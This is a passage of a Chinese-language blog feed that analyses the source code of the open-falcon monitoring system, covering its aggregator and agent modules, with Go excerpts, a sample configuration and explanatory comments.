class="keyword">else</span> &#123;</span><br><span class="line">denominator, err = strconv.ParseFloat(denominatorStr, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">"[E] strconv.ParseFloat(%s) fail %v, id:%d"</span>, denominatorStr, err, item.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> denominator == <span class="number">0</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[W] denominator == 0, id:"</span>, item.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> validCount == <span class="number">0</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[W] validCount == 0, id:"</span>, item.Id)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"[D] hostname:all  numerator:%0.4f  denominator:%0.4f  per:%0.4f\n"</span>, numerator, denominator, numerator/denominator)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// sender push推送集群数据，给agent节点推送数据，数据传输通过/v1/push转发到transfer,这个地方需要注意的！！！</span></span><br><span class="line">sender.Push(item.Endpoint, item.Metric, item.Tags, numerator/denominator, item.DsType, <span class="keyword">int64</span>(item.Step))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-aggregator源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-aggregator源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon aggregator源码分析&quot;&gt;&lt;/a&gt;open-fal
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon agent源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/agent%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/agent%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:41.265Z</published>
    <updated>2020-01-21T09:06:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-agent源码分析"><a href="#open-falcon-agent源码分析" class="headerlink" title="open-falcon agent源码分析"></a>open-falcon agent源码分析</h2><p>因为工作需要，将这个open-falcon代码逻辑需要整理清楚。有些部分需要定制修改。</p><p>本篇文章主要是针对open-falcon 中agent模块进行分析。</p><p>主流程再module/agent/module中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">check := flag.Bool(<span class="string">"check"</span>, <span class="literal">false</span>, <span class="string">"check collector"</span>)</span><br><span class="line"><span class="comment">//解析参数</span></span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *check &#123;</span><br><span class="line">        <span class="comment">// 检查当前系统磁盘cpu等信息，有问题就退出</span></span><br><span class="line">funcs.CheckCollector()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">g.InitLog(<span class="string">"debug"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">g.InitLog(<span class="string">"info"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化root目录</span></span><br><span class="line">g.InitRootDir()</span><br><span class="line">    <span class="comment">// localip初始化其实就是检查hbs服务是否启动能够连接。同时根据hbs来获取本地ip</span></span><br><span class="line">g.InitLocalIp()</span><br><span class="line">    <span class="comment">// 初始化rpc客户端</span></span><br><span class="line">g.InitRpcClients()</span><br><span class="line"><span class="comment">// 构建需要抓取的指标数据</span></span><br><span class="line">funcs.BuildMappers()</span><br><span class="line"><span class="comment">// 定时更新cpu和disk状态历史数据</span></span><br><span class="line"><span class="keyword">go</span> cron.InitDataHistory()</span><br><span class="line"><span class="comment">// 定时给hbs报告agent本机状态</span></span><br><span class="line">cron.ReportAgentStatus()</span><br><span class="line">    <span class="comment">//同步插件，没咋用过</span></span><br><span class="line">cron.SyncMinePlugins()</span><br><span class="line">    <span class="comment">//调用hbs rpc接口BuiltinMetrics来获取BuiltinMetrics数据。同步监控端口、路径、进程和URL</span></span><br><span class="line">cron.SyncBuiltinMetrics()</span><br><span class="line">    <span class="comment">//定时检查信任ip</span></span><br><span class="line">cron.SyncTrustableIps()</span><br><span class="line">    <span class="comment">//定时收集指标数据</span></span><br><span class="line">cron.Collect()</span><br><span class="line"><span class="comment">//启动http接口方便查询</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看下配置文件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"debug"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"hostname"</span>: <span class="string">""</span>,         </span><br><span class="line">    <span class="attr">"ip"</span>: <span class="string">""</span>,</span><br><span class="line">    "plugin": &#123;               # 插件</span><br><span class="line">        "enabled": false,</span><br><span class="line">        "dir": "./plugin",</span><br><span class="line">        "git": "https://github.com/open-falcon/plugin.git",</span><br><span class="line">        "logs": "./logs"</span><br><span class="line">    &#125;,</span><br><span class="line">    "heartbeat": &#123;            # 心跳</span><br><span class="line">        "enabled": true,</span><br><span class="line">        "addr": "127.0.0.1:6030",</span><br><span class="line">        "interval": 60,</span><br><span class="line">        "timeout": 1000</span><br><span class="line">    &#125;,</span><br><span class="line">    "transfer": &#123;             # 传输地址</span><br><span class="line">        "enabled": true,</span><br><span class="line">        "addrs": [</span><br><span class="line">            "127.0.0.1:8433",</span><br><span class="line">            <span class="string">"127.0.0.1:8433"</span></span><br><span class="line">        ],</span><br><span class="line">        "interval": 60,</span><br><span class="line">        "timeout": 1000</span><br><span class="line">    &#125;,</span><br><span class="line">    "http": &#123;                # http</span><br><span class="line">        "enabled": true,</span><br><span class="line">        "listen": ":1988",</span><br><span class="line">        "backdoor": false</span><br><span class="line">    &#125;,</span><br><span class="line">    "collector": &#123;          # 收集接口数据</span><br><span class="line">        "ifacePrefix": ["eth", "em"],</span><br><span class="line">        "mountPoint": []</span><br><span class="line">    &#125;,</span><br><span class="line">    "default_tags": &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    "ignore": &#123;                    </span><br><span class="line">        "cpu.busy": true,</span><br><span class="line">        "df.bytes.free": true,</span><br><span class="line">        "df.bytes.total": true,</span><br><span class="line">        "df.bytes.used": true,</span><br><span class="line">        "df.bytes.used.percent": true,</span><br><span class="line">        "df.inodes.total": true,</span><br><span class="line">        "df.inodes.free": true,</span><br><span class="line">        "df.inodes.used": true,</span><br><span class="line">        "df.inodes.used.percent": true,</span><br><span class="line">        "mem.memtotal": true,</span><br><span class="line">        "mem.memused": true,</span><br><span class="line">        "mem.memused.percent": true,</span><br><span class="line">        "mem.memfree": true,</span><br><span class="line">        "mem.swaptotal": true,</span><br><span class="line">        "mem.swapused": true,</span><br><span class="line">        "mem.swapfree": true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看看InitRootDir函数，主要获取了根目录，为了后续启动http拼接路径。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRootDir</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">Root, err = os.Getwd()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"getwd fail:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取函数InitLocalIp，该函数获取hbs连接。获取本地localip地址，主要为了能够后续给hbs发送心跳报告。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitLocalIp</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> Config().Heartbeat.Enabled &#123;</span><br><span class="line">conn, err := net.DialTimeout(<span class="string">"tcp"</span>, Config().Heartbeat.Addr, time.Second*<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"get local addr failed !"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">LocalIp = strings.Split(conn.LocalAddr().String(), <span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"hearbeat is not enabled, can't get localip"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化hbs的rpc客户端连接：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRpcClients</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> Config().Heartbeat.Enabled &#123;</span><br><span class="line">HbsClient = &amp;SingleConnRpcClient&#123;</span><br><span class="line">RpcServer: Config().Heartbeat.Addr,</span><br><span class="line">Timeout:   time.Duration(Config().Heartbeat.Timeout) * time.Millisecond,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数BuildMappers，构建指标函数，类似于将所有的指标函数注册到map中去。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BuildMappers</span><span class="params">()</span></span> &#123;</span><br><span class="line">interval := g.Config().Transfer.Interval</span><br><span class="line">Mappers = []FuncsAndInterval&#123;</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">AgentMetrics,</span><br><span class="line">CpuMetrics,</span><br><span class="line">NetMetrics,</span><br><span class="line">KernelMetrics,</span><br><span class="line">LoadAvgMetrics,</span><br><span class="line">MemMetrics,</span><br><span class="line">DiskIOMetrics,</span><br><span class="line">IOStatsMetrics,</span><br><span class="line">NetstatMetrics,</span><br><span class="line">ProcMetrics,</span><br><span class="line">UdpMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">DeviceMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">PortMetrics,</span><br><span class="line">SocketStatSummaryMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">DuMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">UrlMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Fs: []<span class="function"><span class="keyword">func</span><span class="params">()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span></span>&#123;</span><br><span class="line">GpuMetrics,</span><br><span class="line">&#125;,</span><br><span class="line">Interval: interval,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数InitDataHistory：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDataHistory</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">funcs.UpdateCpuStat()  <span class="comment">//更新cpu状态信息   方便后续统计的时候用到了。</span></span><br><span class="line">funcs.UpdateDiskStats()  <span class="comment">// 更新disk状态信息</span></span><br><span class="line">time.Sleep(g.COLLECT_INTERVAL)  <span class="comment">// 间隔</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数reportAgentStatus函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReportAgentStatus</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> g.Config().Heartbeat.Enabled &amp;&amp; g.Config().Heartbeat.Addr != <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">go</span> reportAgentStatus(time.Duration(g.Config().Heartbeat.Interval) * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReportAgentStatus函数调用reportAgentStatus函数来类似做了一层公共方法转私有分封装：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reportAgentStatus</span><span class="params">(interval time.Duration)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">hostname, err := g.Hostname()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">hostname = fmt.Sprintf(<span class="string">"error:%s"</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req := model.AgentReportRequest&#123;</span><br><span class="line">Hostname:      hostname,</span><br><span class="line">IP:            g.IP(),</span><br><span class="line">AgentVersion:  g.VersionMsg(),</span><br><span class="line">PluginVersion: g.GetCurrPluginVersion(),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> resp model.SimpleRpcResponse</span><br><span class="line">        <span class="comment">// 调用hbs rpc接口reportStatus上传当前agent状态信息，问题如果agent节点挂了，那么后续可能是通过mock数据去检查了</span></span><br><span class="line">err = g.HbsClient.Call(<span class="string">"Agent.ReportStatus"</span>, req, &amp;resp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || resp.Code != <span class="number">0</span> &#123;</span><br><span class="line">log.Println(<span class="string">"call Agent.ReportStatus fail:"</span>, err, <span class="string">"Request:"</span>, req, <span class="string">"Response:"</span>, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time.Sleep(interval)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的SyncMinPlugins函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SyncMinePlugins</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !g.Config().Plugin.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !g.Config().Heartbeat.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.Config().Heartbeat.Addr == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> syncMinePlugins()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用函数syncMinePlugins：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncMinePlugins</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">timestamp  <span class="keyword">int64</span> = <span class="number">-1</span></span><br><span class="line">pluginDirs []<span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(duration)</span><br><span class="line"></span><br><span class="line">hostname, err := g.Hostname()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req := model.AgentHeartbeatRequest&#123;</span><br><span class="line">Hostname: hostname,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> resp model.AgentPluginsResponse</span><br><span class="line">        <span class="comment">// hbs rpc接口MinePlugins，用来获取MinePlugin插件信息</span></span><br><span class="line">err = g.HbsClient.Call(<span class="string">"Agent.MinePlugins"</span>, req, &amp;resp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"call Agent.MinePlugin fail:"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp.Timestamp &lt;= timestamp &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pluginDirs = resp.Plugins</span><br><span class="line">timestamp = resp.Timestamp</span><br><span class="line"><span class="comment">// 后续就是根据获取的插件信息目录等，启动相关的插件脚本，如果有自定义的插件需要抓取数据等，其实可以再这边写。</span></span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">log.Printf(<span class="string">"call Agent.MinePlugin:%v\n"</span>, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pluginDirs) == <span class="number">0</span> &#123;</span><br><span class="line">plugins.ClearAllPlugins()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">desiredAll := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*plugins.Plugin)</span><br><span class="line">filefmt_scripts := [][]<span class="keyword">string</span>&#123;&#125;</span><br><span class="line">dirfmt_scripts := []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, script_path := <span class="keyword">range</span> pluginDirs &#123;</span><br><span class="line"><span class="comment">//script_path could be a DIR or a SCRIPT_FILE_WITH_OR_WITHOUT_ARGS</span></span><br><span class="line"><span class="comment">//比如： sys/ntp/60_ntp.py(arg1,arg2) 或者 sys/ntp/60_ntp.py 或者 sys/ntp</span></span><br><span class="line"><span class="comment">//1. 参数只对单个脚本文件生效，目录不支持参数</span></span><br><span class="line"><span class="comment">//2. 如果某个目录下的某个脚本被单独绑定到某个机器，那么再次绑定该目录时，该文件会不会再次执行</span></span><br><span class="line"><span class="keyword">var</span> args <span class="keyword">string</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">re := regexp.MustCompile(<span class="string">`(.*)\((.*)\)`</span>)</span><br><span class="line">path_args := re.FindAllStringSubmatch(script_path, <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">if</span> path_args != <span class="literal">nil</span> &#123;</span><br><span class="line">script_path = path_args[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">args = path_args[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abs_path := filepath.Join(g.Config().Plugin.Dir, script_path)</span><br><span class="line"><span class="keyword">if</span> !file.IsExist(abs_path) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file.IsFile(abs_path) &#123;</span><br><span class="line">filefmt_scripts = <span class="built_in">append</span>(filefmt_scripts, []<span class="keyword">string</span>&#123;script_path, args&#125;)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dirfmt_scripts = <span class="built_in">append</span>(dirfmt_scripts, 